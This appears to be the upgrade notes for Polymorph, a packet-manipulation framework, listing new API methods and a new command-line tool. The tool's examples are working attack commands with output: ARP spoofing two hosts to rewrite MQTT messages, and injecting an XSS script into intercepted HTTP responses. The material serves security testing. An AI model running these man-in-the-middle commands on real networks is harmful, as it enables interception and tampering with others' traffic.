## Polymorph Upgrade

```
pip3 install polymorph --upgrade
```

## Major changes

### 1. New methods added to the packet class
New methods have been added that can be accessed in the preconditions, postconditions and executions through the packet object.
```
packet.global_var(name, default_value): Create a global variable
packet.set_payload(raw_payload): Sets the bytes of the packet
packet.get_payload(): Return the bytes of the packet
packet.insert(start_byte, end_byte, value): inserts a value between bytes of the packet
```

### 2. Modification of preconditions postconditions and executions on disk
Now if from the main interface of Polymorph you use the command `precs -a prec1` where `prec1` is an existing precondition, the framework opens the existing precondition to be modified.

### 3. Insert preconditions, postconditions and executions from any system path
Now you can use the `precs/posts/execs -i path` command from the main Polymorph interface to insert `.py` files with the structure of the conditional functions from any system path.

### 4. Change the position of preconditions, postconditions and executions in a template
Now you can change the position of the conditional functions that have been added to a template, by executing the following command from the Polymorph main interface:
```
PH:cap/t0 > precs                                                               
new2
new3

PH:cap/t0 > precs -c new3 -p 0                                                  
PH:cap/t0 > precs                                                               
new3
new2
```

### 5. The Polymorph main interface no longer accepts command line parameters
Actions such as `# polymorph -t template.json` **are no longer supported**, now you can perform the import actions from the main interface of the framework:
```
PH > import -h                                                                  
Usage: import [-option]
      Import different objects in the framework, such as templates or captures.

      Options:
	-h		prints the help.
	-t		path to a template to be imported.
	-pcap		path to a pcap file to be imported
```

### 6. Added a command line interface. Phcli
A new component has been added to the Polymorph framework, a command line interface. Below are examples of use.
#### Modifying the MQTT protocol

Let's see how to use the Polymorph command line interface to spoof the communication between two machines and modify MQTT protocol.

 - Let's start by seeing how the Polymorph framework dissects the MQTT Publish packet.
```
# phcli -p mqtt --show-fields --in-pkt test_topic

[INFO] Waiting for a network packet which implements the MQTT protocol
[INFO] The packet will be dissected to show its fields
[OK] Sniffing process started. Waiting for packets...
[OK] Packet captured. Printing the fields...

---[ RAW.MQTT ]---
str hdrflags          = 0 (0x00000030)
int msgtype           = 48 (3)
int dupflag           = 48 (0)
int qos               = 48 (0)
int retain            = 48 (0)
int len               = 24 (24)
int topic_len         = 10 (10)
str topic             = test_topic (test_topic)
str msg               = test_message (test_message)
```

 - Now that we know how polymorph dissects the MQTT Publish packets and how it names the fields, we are going to modify the `msg` field by spoofing the two remote machines that communicate using MQTT.

```
# phcli -s arp -tg 192.168.1.102 -g 192.168.1.121 -p mqtt -f msg -v "new_value" --in-pkt "test_topic"

[OK] ARP spoofing started between 192.168.1.121 and 192.168.1.102
[INFO] Polymorph needs to capture a packet like the one you want to modify in real time to learn how it is.
[INFO] It will be in sniffing mode until you generate the packet
[OK] Sniffing mode started. Waiting for packets...
[INFO] Great! Polymorph has the structure of the packet! Let's start breaking things!
[OK] Process of interception and modification of packets in real time started.
[*] Waiting for packets...

(Press Ctrl-C to exit)

###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 75
  id        = 28767
  flags     = DF
  frag      = 0
  ttl       = 63
  proto     = tcp
  chksum    = 0x471e
  src       = 192.168.1.102
  dst       = 192.168.1.121
  \options   \
###[ TCP ]### 
     sport     = 49198
     dport     = 1883
     seq       = 4046645883
     ack       = 938260113
     dataofs   = 8
     reserved  = 0
     flags     = PA
     window    = 229
     chksum    = 0x7526
     urgptr    = 0
     options   = [('NOP', None), ('NOP', None), ('Timestamp', (3643906, 1823353))]
###[ Raw ]### 
        load      = '0\x16\x00\ntest_topicnew_value'
```

#### Modifying the HTTP protocol

Let's see a last example modifying HTTP packages to inject a simple XSS in localhost. After executing the command simply navigate with your browser through an HTTP page.
```
# phcli -p tcp --in-pkt "</html>" -b "\-54:\-20" -v '"><script>alert("hacked")</script>' -ipt "iptables -A INPUT -j NFQUEUE --queue-num 1"

[INFO] Polymorph needs to capture a packet like the one you want to modify in real time to learn how it is.
[INFO] It will be in sniffing mode until you generate the packet
[OK] Sniffing mode started. Waiting for packets...
[INFO] Great! Polymorph has the structure of the packet! Let's start breaking things!
[OK] Process of interception and modification of packets in real time started.
[*] Waiting for packets...

(Press Ctrl-C to exit)

###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 898
  id        = 9382
  flags     = DF
  frag      = 0
  ttl       = 54
  proto     = tcp
  chksum    = 0xef66
  src       = 194.150.169.131
  dst       = 192.168.0.167
  \options   \
###[ TCP ]### 
     sport     = http
     dport     = 52210
     seq       = 3481765999
     ack       = 2589984605
     dataofs   = 8
     reserved  = 0
     flags     = PA
     window    = 2049
     chksum    = 0x3df4
     urgptr    = 0
     options   = [('NOP', None), ('NOP', None), ('Timestamp', (4180691237, 3065344385))]
###[ Raw ]### 
        load      = 'm Mongo\n10.  Elite World News by Dr. Dude\n11.  Elite World News by Dr. Dude\n\n\nComing soon...\n\n                                 Phrack Jolt!\n\n                       All the VMBs and TWICE the c0deZ!\n_______________________________________________________________________________\n</pre>\n\n</div>\n</div>\n\n</center>\n\n<div align="center" class="texto-2-bold">\n[ <a href="../../index.html" title="News">News</a> ]\n[ <a href="../../papers/dotnet_instrumentation.html" title="Paper Feed">Paper Feed</a> ]\n[ <a href="../../issues/69/1.html" title="Issues">Issues</a> ]\n[ <a href="../../authors.html" title="Authors">Authors</a> ]\n[ <a href="../../archives/" title="Archives">Archives</a> ]\n[ <a href="../../contact.html" title="Contact">Contact</a> ]\n</div>\n\n<div align="right" class="texto-1">\xc2\xa9 Copyl"><script>alert("hacked")</script>iv>\n</body>\n</html>\n'
```
